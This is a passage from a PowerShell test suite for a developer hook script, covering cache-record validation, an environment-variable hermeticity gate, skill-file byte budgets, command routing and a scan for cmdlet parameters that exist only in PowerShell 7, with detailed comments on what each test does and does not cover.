# security_considerations[1] - "the open-window candidate validation must reject
# a stale or garbage cache line rather than letting it re-enable narrowing".
# A dead open-window record (an abandoned claim's leftover, a rebase-orphaned or
# corrupt SHA) has no completion coming to absorb anything, so treating it as a
# live absorber would resurrect the D271 under-report through one junk cache
# line. 24d pins the predicate as a unit; this pins that a real completion still
# reports both changes with the junk line present - and pins it on the
# CANDIDATE VALIDATION specifically, not on the age branch that would otherwise
# reject the same line for a different reason.
if (-not $g26Git) {
    Write-Host "  SKIP: 26i: the stale-record case needs git" -ForegroundColor Yellow
} else {
    $g26i = New-D272Repo -Name 'stale-open-record'
    Invoke-D272Claim -Dir $g26i -TaskId '100'
    # STAMPED FRESH, and that is the whole difficulty of this fixture. An
    # UNSTAMPED record reads dead on the AGE branch, so an unstamped junk line
    # is rejected before the candidate validation is ever consulted - the first
    # version of this case was written that way and passed with the resolvable +
    # ancestor checks deleted, i.e. it pinned the branch its own comment did not
    # name. The stamp is built with the WRITER's expression (stride-hook.ps1:633)
    # rather than a convenient equivalent, for the reason W2102 filed: a fixture
    # sharing the READER's expression is self-consistent by construction and can
    # never see the two disagree.
    $g26iEpoch = New-Object DateTime(1970, 1, 1, 0, 0, 0, [DateTimeKind]::Utc)
    $g26iNow = [string][int64][math]::Floor(([DateTime]::UtcNow - $g26iEpoch).TotalSeconds)
    Add-Content -Path (Join-Path $g26i '.stride-env-cache') -Encoding UTF8 -Value @(
        "TASK_BASE_REF_999='deadbeefdeadbeefdeadbeefdeadbeefdeadbeef'",
        "TASK_BASE_AT_999='$g26iNow'")
    Add-D272Commit -Dir $g26i -File 'manual.txt'
    Add-Content -Path (Join-Path $g26i 'tracked.txt') -Value 'dirty' -Encoding UTF8
    Invoke-D272Complete -Dir $g26i -TaskId '100'
    Assert-Eq "26i (D271): a stale open-window record never re-narrows an outermost task's snapshot" `
        "manual.txt,tracked.txt" (Get-D272Paths -Dir $g26i)
}

# ============================================================
# Test Group 27: W2105 — the hermeticity gate itself (mirrors sh 26 / D235)
# ============================================================
# The gate at the top of this file is load-bearing for every assertion below
# it, and nothing asserted the gate. Its bash twin's group exists for exactly
# that reason. Each probe runs THIS script as a child with --gate-probe, so the
# gate's effect is observed from outside rather than reasoned about.
#
# EVERY PROBE PINS STRIDE_TEST_KEEP_ENV EXPLICITLY. The flag is itself a
# suite-read variable the gate cannot neutralise - it IS the switch - so without
# pinning, a child inherits it, takes the opt-out branch, and these turn red for
# a developer using the documented escape hatch. 27d is the one case that sets
# it deliberately.
Write-Host ""
Write-Host "=== Test Group 27: W2105 hermeticity gate (D235) ==="

$g27Self = $PSCommandPath
function Invoke-GateProbe {
    param([hashtable]$Env = @{})
    $psi = [System.Diagnostics.ProcessStartInfo]::new()
    $psi.FileName = 'pwsh'
    $psi.Arguments = "-NoProfile -File `"$g27Self`" --gate-probe"
    $psi.RedirectStandardOutput = $true
    $psi.RedirectStandardError = $true
    $psi.UseShellExecute = $false
    $psi.CreateNoWindow = $true
    # Start from a CLEAN slate for every name the gate knows about, so a probe
    # measures what it sets rather than what this process happens to carry.
    foreach ($n in @($script:StrideHookEnvVars + @('STRIDE_TEST_KEEP_ENV'))) {
        $null = $psi.Environment.Remove($n)
    }
    # The TASK_BASE_REF_* family is open-ended (D226) and the gate sweeps it by
    # PREFIX, so removing one hard-coded name is not a clean slate: Group 22
    # leaves TASK_BASE_REF_42 and _77 set in this process, and 27e - the case
    # asserting a clean environment is SILENT - saw them and failed. Sweep the
    # same prefix the gate does, for the same reason the gate does.
    foreach ($n in @($psi.Environment.Keys)) {
        if ("$n" -like 'TASK_BASE_REF_*') { $null = $psi.Environment.Remove($n) }
    }
    foreach ($kv in $Env.GetEnumerator()) { $psi.Environment[$kv.Key] = $kv.Value }
    $proc = [System.Diagnostics.Process]::Start($psi)
    $out = $proc.StandardOutput.ReadToEnd() + $proc.StandardError.ReadToEnd()
    $proc.WaitForExit()
    return $out
}

# 27a: it detects an inherited variable and names it.
# SCOPED TO THE GATE'S OWN REPORT, not to the whole child output. The probe
# prints AFTER_GATE:<NAME>=... for every name it knows, so those names are in
# the output whatever the gate did - asserting against the whole thing passed
# with the gate's report deleted, and with the gate deleted. Everything before
# the first AFTER_GATE line is the report and nothing else.
function Get-GateReport { param([string]$Out) return ($Out -split 'AFTER_GATE:')[0] }

$g27a = Invoke-GateProbe -Env @{ STRIDE_HOOK_TIMEOUT_OVERRIDE = '200' }
Assert-Contains "27a: the gate reports an inherited variable BY NAME" `
    "STRIDE_HOOK_TIMEOUT_OVERRIDE" (Get-GateReport $g27a)

# 27b: it reports the NAME and never the VALUE. A gate that echoes a bearer
# token into a CI log is worse than the leak it fixes. BOTH reporting paths are
# covered - the fixed list and the TASK_BASE_REF_* prefix sweep - because a
# canary in only one leaves the other free to reintroduce value-printing.
$g27b = Invoke-GateProbe -Env @{ TASK_ID = 's3cr3t-fixed-list'; TASK_BASE_REF_99 = 's3cr3t-prefix-sweep' }
Assert-Contains "27b: the gate names a fixed-list variable" "TASK_ID" (Get-GateReport $g27b)
Assert-Contains "27b: and the dynamic base-ref variable" "TASK_BASE_REF_99" (Get-GateReport $g27b)
foreach ($g27Canary in @('s3cr3t-fixed-list', 's3cr3t-prefix-sweep')) {
    # The AFTER_GATE lines print values by design, so only the gate's own
    # REPORT is under test here.
    Assert-Eq "27b: the gate never prints a VALUE ($g27Canary)" "False" `
        "$((Get-GateReport $g27b).Contains($g27Canary))"
}

# 27c: it actually UNSETS, rather than only reporting. This is the assertion
# that separates a gate from a notice.
$g27c = Invoke-GateProbe -Env @{ STRIDE_HOOK_TIMEOUT_OVERRIDE = '200' }
Assert-Contains "27c: the inherited variable is CLEARED, not just reported" `
    "AFTER_GATE:STRIDE_HOOK_TIMEOUT_OVERRIDE=<unset>" $g27c

# 27d: the opt-out preserves the value and says the run is not hermetic.
$g27d = Invoke-GateProbe -Env @{ STRIDE_HOOK_TIMEOUT_OVERRIDE = '200'; STRIDE_TEST_KEEP_ENV = '1' }
Assert-Contains "27d: STRIDE_TEST_KEEP_ENV=1 preserves the value" `
    "AFTER_GATE:STRIDE_HOOK_TIMEOUT_OVERRIDE=200" $g27d
Assert-Contains "27d: and the opt-out warns the run is NOT hermetic" "NOT hermetic" $g27d

# 27e: a clean environment says nothing at all - no noise on the common path.
$g27e = Invoke-GateProbe
Assert-Eq "27e: a clean environment produces no gate output" "False" `
    "$($g27e.Contains('neutralising inherited'))"

# 27f: THE TWO NAMES THAT CARRY THE REAL RISK, pinned individually.
# Everything above probes STRIDE_HOOK_TIMEOUT_OVERRIDE, which is a timeout. The
# gate's own header says why the other two matter: CLAUDE_PROJECT_DIR points
# hook code at a project directory, and TASK_BASE_REF selects the git range a
# snapshot walks - an ambient one silently changes what a capture captures, in
# the developer's real repo. Dropping either from $script:StrideHookEnvVars
# would shrink the gate, and until now would have shrunk its test in lockstep,
# because both the probe and the harness iterate that same list. These two rows
# name the variables literally, so a shrunken list turns them red.
#
# WHAT THIS GROUP DOES AND DOES NOT COVER, stated because the task's security
# consideration is broader than the gate: the gate neutralises ENVIRONMENT
# VARIABLES. It is not what keeps the suite off the network or out of the
# developer's repo - per-case temp fixtures and unreachable 127.0.0.1:1 URLs do
# that. The task's manual_tests entry (introduce a real network call and a real
# repo mutation and see whether they are caught) is NOT performed by this group
# and is recorded as not done rather than implied.
$g27f = Invoke-GateProbe -Env @{ CLAUDE_PROJECT_DIR = '/tmp/not-a-real-project'; TASK_BASE_REF = 'deadbeef' }
Assert-Contains "27f: the gate reports CLAUDE_PROJECT_DIR, which aims hook code at a directory" `
    "CLAUDE_PROJECT_DIR" (Get-GateReport $g27f)
Assert-Contains "27f: and TASK_BASE_REF, which selects the git range a capture walks" `
    "TASK_BASE_REF" (Get-GateReport $g27f)
Assert-Contains "27f: CLAUDE_PROJECT_DIR is CLEARED, not merely reported" `
    "AFTER_GATE:CLAUDE_PROJECT_DIR=<unset>" $g27f
Assert-Contains "27f: and so is TASK_BASE_REF" `
    "AFTER_GATE:TASK_BASE_REF=<unset>" $g27f

# ============================================================
# Test Group 28: W2105 — hot-path skill byte budgets (mirrors sh 28 / W2079)
# ============================================================
# The bash suite's Group 29 banner says "the ps1 twin suite has no Group 29:
# host-agnostic repo gates live in the bash suite only, as with Group 28."
# W2105 changes that for Group 28 specifically: the budget check now has a
# PowerShell counterpart so a Windows-only contributor running only this suite
# still gets the drift detector. That sentence in the bash banner is now stale
# for Group 28, and cannot be corrected from here - test-stride-hook.sh is
# read-only for this task - so it is recorded in CHANGELOG.md instead.
Write-Host ""
Write-Host "=== Test Group 28: W2105 hot-path skill byte budgets (W2079) ==="

$g28Script = Join-Path (Split-Path -Parent (Split-Path -Parent $PSCommandPath)) 'scripts/check-skill-budgets.ps1'
if (-not (Test-Path -LiteralPath $g28Script)) {
    Write-Host "  FAIL: 28a: scripts/check-skill-budgets.ps1 is missing" -ForegroundColor Red
    $script:FAIL++
} else {
    $g28Out = (& pwsh -NoProfile -File $g28Script 2>&1 | Out-String)
    $g28Rc = $LASTEXITCODE
    Assert-Eq "28a: all hot-path skill files are under budget" "0" "$g28Rc"
    Assert-Contains "28a: and the check names each budgeted file" "stride-workflow/SKILL.md" $g28Out

    # 28b: THE TWO IMPLEMENTATIONS MUST AGREE, or neither detects drift. The
    # bash script is the original and stays authoritative; this asserts the
    # PowerShell one reports the same files, sizes and budgets rather than
    # merely also exiting 0. A ps1 script with a stale budget table would pass
    # 28a forever while the gate it mirrors had moved.
    #
    # The task's own edge case is the reason this compares BYTES: the two could
    # disagree on a CRLF or multi-byte file if one decoded text instead of
    # reading raw bytes. `wc -c` and ReadAllBytes().Length both count bytes.
    if (Get-Command bash -ErrorAction SilentlyContinue) {
        $g28Bash = (& bash (Join-Path (Split-Path -Parent (Split-Path -Parent $PSCommandPath)) 'scripts/check-skill-budgets.sh') 2>&1 | Out-String)
        # The self-reference is normalised out: each script's missing-file error
        # names ITSELF ("the table is in scripts/check-skill-budgets.sh|.ps1"),
        # so a renamed budgeted file would fail this on a cosmetic difference
        # rather than on a real disagreement. Note also that the cross-check
        # only ever exercises the CLEAN path - neither the over-budget nor the
        # missing-file branch runs here - so agreement is pinned on that path
        # alone, which is the honest scope of this assertion.
        $g28Norm = { param($t) (($t -split "`n") | Where-Object { $_ -like 'ok:*' -or $_ -like 'BUDGET*' } | ForEach-Object { $_.TrimEnd("`r") -replace 'check-skill-budgets\.(sh|ps1)', 'check-skill-budgets.<impl>' }) -join "`n" }
        Assert-Eq "28b: the PowerShell and bash budget checks report byte-identical lines" `
            (& $g28Norm $g28Bash) (& $g28Norm $g28Out)
    } else {
        Write-Host "  SKIP: 28b: cross-check needs bash" -ForegroundColor Yellow
    }
}

# ============================================================
# Test Group 29: W2105 — D220 command routing (mirrors sh 22)
# ============================================================
# sh 22 sources the hook and exercises the routing table in isolation. The ps1
# equivalent extracts the same predicates by AST, as Groups 24 and 25 already
# do, so the assertions run against the SHIPPED functions rather than copies.
#
# ALL FIVE sh 22 CASES ARE MIRRORED. An earlier draft of this banner recorded
# 22c/22d/22e as unmirrorable "because this port has no heredoc scanning" - it
# has both Get-StrideHeredocDelim and Remove-StrideHeredocBodies, and the
# extraction below fails without them. The claim was wrong and is corrected
# here rather than dropped, because an omission ledger that invents reasons is
# worse than one that omits loudly.
Write-Host ""
Write-Host "=== Test Group 29: W2105 D220 command routing ==="

$g29Ast = [System.Management.Automation.Language.Parser]::ParseFile($HookScript, [ref]$null, [ref]$null)
$g29Defs = @{}
foreach ($f in $g29Ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.FunctionDefinitionAst] }, $true)) {
    $g29Defs[$f.Name] = $f.Extent.Text
}
# THE DEPENDENCY CLOSURE, RESOLVED RATHER THAN LISTED. Get-StrideRoute calls
# helpers that call helpers; naming them by hand meant adding one, running,
# reading the next NOT-RECOGNIZED error and adding that. A hand-list is also
# exactly the thing that rots the first time the hook grows a helper. Seed with
# the entry points and pull in any hook function a seeded body names, to a
# fixpoint.
$g29Seed = @('Get-StrideRoute', 'Get-TaskIdFromCommand', 'Get-StrideHeredocDelim',
             'Remove-StrideHeredocBodies')
$g29Want = New-Object System.Collections.Generic.HashSet[string]
foreach ($n in $g29Seed) { $null = $g29Want.Add($n) }
$g29Grew = $true
while ($g29Grew) {
    $g29Grew = $false
    foreach ($n in @($g29Want)) {
        if (-not $g29Defs.ContainsKey($n)) { continue }
        foreach ($cand in $g29Defs.Keys) {
            if ($g29Want.Contains($cand)) { continue }
            if ($g29Defs[$n] -match ("(?<![A-Za-z0-9-])" + [regex]::Escape($cand) + "(?![A-Za-z0-9-])")) {
                $null = $g29Want.Add($cand); $g29Grew = $true
            }
        }
    }
}
$g29Found = @()
foreach ($n in @($g29Want)) {
    if (-not $g29Defs.ContainsKey($n)) { continue }
    $g29Found += $n
    . ([scriptblock]::Create($g29Defs[$n]))
}
# The extracted functions ship with script-scope STATE that lives at the hook's
# top level, outside every function extent, so the closure cannot carry it.
# Remove-StrideHeredocBodies READS $script:StrideQuoteState before writing it,
# so Group 29 worked only by the accident that 29a calls Get-StrideRoute first
# (which assigns it). Seeded here, mirroring stride-hook.ps1's own
# initialisation, so the group has no ordering dependency.
$script:StrideQuoteState = ''
$script:StrideQuoteRest = ''
$g29Missing = @($g29Seed | Where-Object { $g29Found -notcontains $_ })
if ($g29Missing.Count -gt 0) {
    Write-Host "  FAIL: 29-harness: could not extract: $($g29Missing -join ', ')" -ForegroundColor Red
    $script:FAIL++
} else {
    Write-Host "  PASS: 29-harness: $($g29Found.Count) routing functions extracted from the real hook (closure of $($g29Seed.Count) entry points)" -ForegroundColor Green
    $script:PASS++

    # 29a: the routing table itself. Each row is a command and the endpoint it
    # must produce - the ps1 form of sh 22a. Get-StrideRoute returns an OBJECT,
    # so the Endpoint field is what gets compared; an earlier draft compared the
    # object itself and every row failed on its rendering.
    foreach ($g29Row in @(
        @{ Cmd = 'curl -X POST https://x/api/tasks/claim';             Route = 'claim' },
        @{ Cmd = 'curl -X PATCH https://x/api/tasks/42/complete';      Route = 'complete' },
        @{ Cmd = 'curl -X PATCH https://x/api/tasks/42/mark_reviewed'; Route = 'mark_reviewed' },
        @{ Cmd = 'curl -X GET https://x/api/tasks/next';               Route = '' },
        @{ Cmd = 'echo not a stride call';                             Route = '' }
    )) {
        Assert-Eq "29a (D220): '$($g29Row.Cmd)' routes to '$($g29Row.Route)'" `
            $g29Row.Route "$((Get-StrideRoute -Phase 'post' -CommandText $g29Row.Cmd).Endpoint)"
    }

    # 29b: task ids come ONLY from an accepted request URL - the ps1 form of
    # sh 22b. A digit sequence elsewhere on the command line must not be
    # scraped, because the id decides which task a diff is PUT to. This is the
    # guard that stopped the live PUT to task 999999999.
    Assert-Eq "29b (D220): the id comes from the /complete URL" "42" `
        "$(Get-TaskIdFromCommand -CommandText 'curl -X PATCH https://x/api/tasks/42/complete')"
    Assert-Eq "29b (D220): a bare number elsewhere is NOT scraped as an id" "" `
        "$(Get-TaskIdFromCommand -CommandText 'echo 99 && curl -X POST https://x/api/tasks/claim')"
    Assert-Eq "29b (D220): and a claim URL carries no id at all" "" `
        "$(Get-TaskIdFromCommand -CommandText 'curl -X POST https://x/api/tasks/claim')"

    # 29c (sh 22c): heredoc delimiter derivation, row for row against bash's
    # own table. The delimiter decides where a heredoc BODY ends, and a body
    # that dequeues early leaks its contents into the routing scan.
    $g29Delims = @('EOF', "'EOF'", 'E\''F', '"''"', "''", "'A B' rest", 'a\ b rest', '$''xy''', '"a\bc"', ' ;')
    $g29DelimOut = ''
    foreach ($w in $g29Delims) {
        $d = Get-StrideHeredocDelim -Word $w
        $g29DelimOut += ('{0}/{1}|' -f $d.Delim, [int][bool]$d.Any)
    }
    Assert-Eq "29c (D220): heredoc delimiter derivation follows bash" `
        'EOF/1|EOF/1|E''F/1|''/1|/1|A B/1|a b/1|xy/1|a\bc/1|/0|' $g29DelimOut

    # 29d (sh 22d): an ANSI-C delimiter carrying an escape this port does not
    # interpret is marked UNSAFE, so the heredoc never terminates rather than
    # terminating early on a delimiter shorter than bash's.
    $g29UnsafeOut = ''
    foreach ($w in @('$''a\nb''', '$''\x41''', '$''a\\''b''', '$''xy''', "'EOF'")) {
        $g29UnsafeOut += [int][bool](Get-StrideHeredocDelim -Word $w).Unsafe
    }
    Assert-Eq "29d (D220): uninterpretable ANSI-C escapes mark the delimiter unsafe" `
        "11000" $g29UnsafeOut

    # 29e (sh 22e): end to end - the body of an unsafe-delimiter heredoc is
    # never scanned, so a completion curl inside it routes nowhere.
    $g29Unsafe = "cat <<`$'a\nb'`ncurl -X PATCH https://x/api/tasks/42/complete`n"
    Assert-Eq "29e (D220): an unsafe-delimiter body is not scanned" "" `
        "$((Get-StrideRoute -Phase 'post' -CommandText (Remove-StrideHeredocBodies -CommandText $g29Unsafe)).Endpoint)"
    # CONTROL: the same curl OUTSIDE any heredoc still routes, so 29e cannot
    # pass merely because the fixture could never have routed.
    $g29Safe = "curl -X PATCH https://x/api/tasks/42/complete`n"
    Assert-Eq "29e (D220): CONTROL - the same curl outside a heredoc does route" "complete" `
        "$((Get-StrideRoute -Phase 'post' -CommandText (Remove-StrideHeredocBodies -CommandText $g29Safe)).Endpoint)"
}

# ============================================================
# W2105 COVERAGE LEDGER: what this suite mirrors, and what it does not
# ============================================================
# Acceptance criterion 1 asks for a ps1 counterpart to sh Groups 9, 11, 22, 24,
# 26 and 28, "or a recorded reason a given group cannot be mirrored". Two of the
# six needed no new group because they were ALREADY mirrored under a different
# number - the suites diverge in numbering from sh Group 7 onward, so mirroring
# by number would have produced duplicates and called it coverage.
#
#   sh 9  after_goal routing (W504)          -> ps1 Group 8, PARTIALLY. The
#         detection and routing core is mirrored (with sh 10 / W506). SEVEN
#         behaviours are NOT, each a live ps1 branch: the raw tool_response
#         shape where the response IS the API object with no stdout key
#         (stride-hook.ps1:1689); an entirely absent "hooks" key; a PASSING
#         after_goal writing nothing to fd 2 (D65 - asserted for other hooks,
#         never for this one); the negative half of env forwarding, that a
#         non-matching hook entry's env must not leak; an EMPTY canonical
#         response file being ignored (:1095); an INVALID-JSON canonical file
#         degrading cleanly; and the fd-2 silence of the success path.
#   sh 11 End-to-end PUT round-trip (W835)   -> NOT MIRRORED, and this is a
#         recorded omission rather than a counterpart. sh 11 is an OPT-IN test
#         against a REAL kanban server (STRIDE_TEST_E2E_URL/TOKEN/TASK_ID, with
#         a production-hostname refusal) that GETs the task back and asserts
#         the persisted changed_files is neither null nor [] and equals the
#         snapshot. Its own banner says it exists because stub-only tests
#         "missed a body-shape regression (D35) because they never crossed the
#         wire". ps1 Group 7 is the mirror of sh Group 8, and 7a is a recording
#         HttpListener stub comparing the request body it just sent against the
#         local snapshot - nothing server-side is read back, so the regression
#         class sh 11 exists for is invisible to it. Only sh 11c's fail-soft
#         half has a ps1 counterpart (7d). Mirroring this needs an E2E gate the
#         ps1 suite does not have. Consequence worth stating: the ps1 base64
#         envelope shape has never been proved acceptable to a real server by
#         either suite.
#   sh 22 D220 command routing               -> ps1 Group 29 (NEW). All five
#         cases, including the heredoc ones an earlier draft of this ledger
#         wrongly recorded as unmirrorable.
#   sh 24 D228 failing after_goal not silent -> ps1 Group 8 (8d1-8d4) and
#         Group 20, PARTIALLY. Mirrored: the JSON context field, the stderr
#         shout, the durable marker, the success path staying quiet, the
#         empty-section case; sh 24e's one-JSON-document rule is ps1 Group 20,
#         not Group 8. NOT mirrored: 24h (only after_goal ran - the single
#         object must sit at the document ROOT with no "sections" wrapper;
#         ps1 Group 20 exercises only the two-section case, which structurally
#         cannot see a wrapper emitted for one); 24i (with .stride/ unwritable
#         the section must STILL RUN - ps1 19g asserts only exit 0 and chmods
#         the project dir rather than .stride/, so it would pass while the
#         quality gate silently never ran, which is the regression 24i guards);
#         and the ABSENT-section half of 24g.
#   sh 26 hermeticity gate (D235)            -> ps1 Group 27 (NEW). See that
#         group's own note on what it does and does not assert - it covers
#         environment neutralisation, NOT network or repository isolation.
#   sh 28 hot-path skill byte budgets        -> ps1 Group 28 (NEW), invoking
#         the new scripts/check-skill-budgets.ps1 and cross-checking it against
#         the bash script on the CLEAN path (the over-budget and missing-file
#         branches are not exercised by the cross-check).
#
# STILL BASH-ONLY, with the reason:
#   sh 29 W2099 ps1 5.1 static gate. Deliberate: the gate analyses hooks/*.ps1
#         from outside, and a ps1 suite gating itself would certify its own
#         host. The bash banner's claim that Group 28 is bash-only "as with
#         Group 29" is now stale for 28 and cannot be corrected from here -
#         test-stride-hook.sh is read-only for this task - so it is recorded in
#         CHANGELOG.md instead.
#   The D236/D255 fallback-world cases (sh 23j, 23n, 23o, 23p, 23q, 23v) and
#         sh 23z4/23z5 remain unmirrored; those are recorded in Group 24's own
#         omission list, which is where a reader looking for attribution
#         coverage will be.
#
# THE DIFFERENTIAL, RECORDED SO IT IS A NUMBER RATHER THAN AN IMPRESSION
# (acceptance criterion 4). Assertion CALL SITES, counted by grep at W2105:
#   ps1  750   sh  594
# The ps1 suite is not a subset: it carries the whole D226/D255/D256/D268/D271/
# D272/D273/D274/D280 port coverage AND the groups above, while the bash suite
# keeps the host-agnostic repo gates. Executed assertions differ from call
# sites because both suites loop over tables; the executed totals at W2105 are
# ps1 957 and sh 787, printed by each suite's own summary line.

# ============================================================
# Test Group 30: D277 — 7-only cmdlet PARAMETERS
# ============================================================
# scripts/check-ps1-compat.sh checks PowerShell 7-only SYNTAX and 7-only cmdlet
# NAMES. It cannot see a 7-only PARAMETER on a cmdlet that exists in 5.1, and
# README.md records that as a deliberate gap. D277 is what that gap costs:
# Invoke-WebRequest -SkipHttpErrorCheck bound on pwsh 7 and threw a
# ParameterBindingException on the shipping 5.1 host, where surrounding catches
# blamed a transport failure — so the changed_files PUT never issued and D119's
# after_goal detection silently no-opped, while every test stayed green.
#
# Both instances were found by READING. This group is so the next one is not.
# It walks the AST of every hooks/*.ps1 and scripts/*.ps1 file and checks each
# command's named parameters against the 7-only set for that cmdlet.
#
# It is deliberately a DENYLIST and therefore incomplete — a parameter nobody
# has listed still passes. A complete answer needs PSScriptAnalyzer's
# PSUseCompatibleCommands with a 5.1 profile, which is a larger change. This
# catches the class that has actually bitten this repo twice.
Write-Host ""
Write-Host "=== Test Group 30: D277 7-only cmdlet parameters ==="

# Keyed by cmdlet, lowercase. Each entry is a parameter that does NOT exist in
# Windows PowerShell 5.1. Prefix matching is deliberate: PowerShell accepts any
# unambiguous abbreviation, so -SkipHttpError binds -SkipHttpErrorCheck.
$g30Deny = @{
    'invoke-webrequest'  = @('SkipHttpErrorCheck', 'SkipHeaderValidation', 'Resume', 'SslProtocol', 'Authentication', 'Token', 'NoProxy', 'CustomMethod', 'PreserveAuthorizationOnRedirect')
    'invoke-restmethod'  = @('SkipHttpErrorCheck', 'SkipHeaderValidation', 'Resume', 'SslProtocol', 'Authentication', 'Token', 'NoProxy', 'PreserveAuthorizationOnRedirect', 'FollowRelLink', 'ResponseHeadersVariable', 'StatusCodeVariable')
    'convertto-json'     = @('AsArray', 'EscapeHandling')
    'convertfrom-json'   = @('AsHashtable', 'NoEnumerate', 'Depth')
    'get-content'        = @('AsByteStream')
    'set-content'        = @('AsByteStream')
    'add-content'        = @('AsByteStream')
    'foreach-object'     = @('Parallel', 'ThrottleLimit', 'AsJob', 'TimeoutSeconds')
    'get-date'           = @('AsUTC', 'Unixtimeseconds')
    'join-path'          = @('AdditionalChildPath')
    'select-string'      = @('NoEmphasis', 'Raw')
    'sort-object'        = @('Stable', 'Top', 'Bottom')
    'test-connection'    = @('MtuSize', 'Repeat', 'Traceroute', 'TargetName')
}

# ALIASES RESOLVE TO THE CMDLET BEFORE THE LOOKUP. CommandAst.GetCommandName()
# returns the name AS WRITTEN, so `iwr -SkipHttpErrorCheck` - the D277 defect
# itself, one keystroke shorter - would miss every key above and be skipped
# before the parameter loop ran. Nothing else covers it: the static gate's
# settings enable only PSUseCompatibleSyntax and PSUseCompatibleCmdlets, not
# PSAvoidUsingCmdletAliases, so an aliased reintroduction passes both checks.
#
# Resolution is done HERE, once, rather than per command: Get-Alias is resolved
# against the RUNNING host, which is pwsh 7, and that is the right direction -
# an alias 7 knows is exactly what a developer on 7 would type.
# Memoised: this now runs for EVERY command node in six files, not just the
# denylisted ones, and Get-Alias is a cmdlet call per hit. The cache turns
# thousands of lookups into a few dozen.
$script:G30KeyCache = @{}
function Resolve-G30CommandKey {
    param([string]$Name)
    if ($script:G30KeyCache.ContainsKey($Name)) { return $script:G30KeyCache[$Name] }
    $key = $Name.ToLowerInvariant()
    $a = Get-Alias -Name $Name -ErrorAction SilentlyContinue
    if ($a -and $a.ResolvedCommandName) { $key = $a.ResolvedCommandName.ToLowerInvariant() }
    $script:G30KeyCache[$Name] = $key
    return $key
}

# ONE walk, called by both the real-file scan and the 30d probe. It used to be
# two textual copies, which meant 30d validated its own transcription: an edit
# that broke matching in the real loop left the probe loop untouched and 30d
# stayed green while 30b silently stopped detecting anything. A shared function
# is what makes the planted violation exercise the code the assertions rely on.
function Test-Ps1FileForSevenOnlyParams {
    param([string]$Path, [hashtable]$Deny)
    $hits = @()
    $positional = @()
    $ast = [System.Management.Automation.Language.Parser]::ParseFile($Path, [ref]$null, [ref]$null)
    if ($null -eq $ast) { return @{ Hits = $hits; Positional = $positional } }
    $leaf = Split-Path -Leaf $Path
    foreach ($c in $ast.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] }, $true)) {
        $name = $c.GetCommandName()
        if (-not $name) { continue }
        $key = Resolve-G30CommandKey -Name $name
        if (-not $Deny.ContainsKey($key)) { continue }
        foreach ($e in $c.CommandElements) {
            if ($e -is [System.Management.Automation.Language.CommandParameterAst]) {
                foreach ($bad in $Deny[$key]) {
                    # Abbreviation-aware: -SkipHttpError binds -SkipHttpErrorCheck.
                    if ($bad.ToLowerInvariant().StartsWith($e.ParameterName.ToLowerInvariant()) -and
                        $e.ParameterName.Length -ge 3) {
                        $hits += "${leaf}:$($e.Extent.StartLineNumber) $name -$($e.ParameterName)"
                    }
                }
            }
        }
        # Join-Path's third positional argument BINDS -AdditionalChildPath, so it
        # is 7-only without any parameter name appearing at all. This is the form
        # that shipped in D275's drift guard and would have terminated the suite
        # on 5.1 under ErrorActionPreference Stop.
        if ($key -eq 'join-path') {
            $args3 = @($c.CommandElements | Select-Object -Skip 1 |
                Where-Object { $_ -isnot [System.Management.Automation.Language.CommandParameterAst] })
            if ($args3.Count -ge 3) {
                $positional += "${leaf}:$($c.Extent.StartLineNumber) Join-Path with $($args3.Count) positional arguments"
            }
        }
    }
    return @{ Hits = $hits; Positional = $positional }
}

$g30Files = @()
$g30Files += (Get-ChildItem -LiteralPath $ScriptDir -Filter '*.ps1' -File | ForEach-Object { $_.FullName })
$g30ScriptsDir = Join-Path (Split-Path -Parent $ScriptDir) 'scripts'
if (Test-Path -LiteralPath $g30ScriptsDir) {
    $g30Files += (Get-ChildItem -LiteralPath $g30ScriptsDir -Filter '*.ps1' -File | ForEach-Object { $_.FullName })
}
Assert-Eq "30a (D277): the scan found ps1 files to walk" "True" "$($g30Files.Count -gt 0)"

$g30Hits = @()
$g30Positional = @()
foreach ($g30f in $g30Files) {
    $g30r = Test-Ps1FileForSevenOnlyParams -Path $g30f -Deny $g30Deny
    $g30Hits += $g30r.Hits
    $g30Positional += $g30r.Positional
}

Assert-Eq "30b (D277): no 7-only cmdlet parameter in any shipped ps1" "" ($g30Hits -join '; ')
Assert-Eq "30c (D277): no 3-argument Join-Path, which binds the 7-only -AdditionalChildPath" "" ($g30Positional -join '; ')

# 30d: the scan is not vacuous. It must actually flag a planted instance —
# otherwise 30b and 30c pass on any codebase, including one where the AST walk
# is silently broken.
# The probe goes through Test-Ps1FileForSevenOnlyParams - the SAME function 30b
# and 30c depend on - so breaking the walk turns this red instead of leaving it
# green against a private copy. It lives under $TmpDir, outside hooks/ and
# scripts/, so 30b never scans it; the planted text sits in a single-quoted
# here-string, so 30b scanning THIS file does not trip on it either.
$g30Probe = Join-Path $TmpDir 'g30-probe.ps1'
Set-Content -LiteralPath $g30Probe -Encoding UTF8 -Value @'
$r = Invoke-WebRequest -Uri 'http://x' -UseBasicParsing -SkipHttpErrorCheck
$p = Join-Path $a 'b' 'c'
$r2 = iwr -Uri 'http://x' -UseBasicParsing -SkipHttpErrorCheck
'@
$g30PR = Test-Ps1FileForSevenOnlyParams -Path $g30Probe -Deny $g30Deny
$g30PHits = @($g30PR.Hits); $g30PPos = @($g30PR.Positional)
Assert-Eq "30d (D277): the scan flags a planted -SkipHttpErrorCheck" "True" "$($g30PHits.Count -ge 1)"
Assert-Eq "30d (D277): and a planted 3-argument Join-Path" "True" "$($g30PPos.Count -ge 1)"
# THE ALIASED FORM IS A SEPARATE ASSERTION, not a bonus on the one above: the
# scan keyed on the written name until D277's review, so `iwr` skipped the
# parameter loop entirely and the canonical defect passed clean under an alias.
# Two hits means the alias resolved; one means only the spelled-out form landed.
Assert-Eq "30d (D277): and the SAME parameter written through the alias iwr" "2" "$($g30PHits.Count)"
Remove-Item -LiteralPath $g30Probe -Force -ErrorAction SilentlyContinue

# ------------------------------------------------------------
# 30e/30f (D277): the BEHAVIOURAL half of the same defect.
#
# 30a-30d are static: they fail if a 7-only parameter comes back. They say
# nothing about what the code does once it is gone, and the two questions are
# independent - a scan can stay green while the replacement catch is wrong.
#
# What these two pin is the discriminator: an HTTP error yields its REAL
# status, a transport failure yields '000', and the two are distinguishable.
# That is the contract Get-WebExceptionStatus implements by reading
# .Exception.Response and treating a NULL response as the transport case,
# and it is the same contract the bash twin gets from `|| printf '000'`.
#
# HONEST LIMIT, stated because the reverse would be easy to imply: neither of
# these is red against the pre-fix code ON THIS HOST. pwsh 7 BINDS
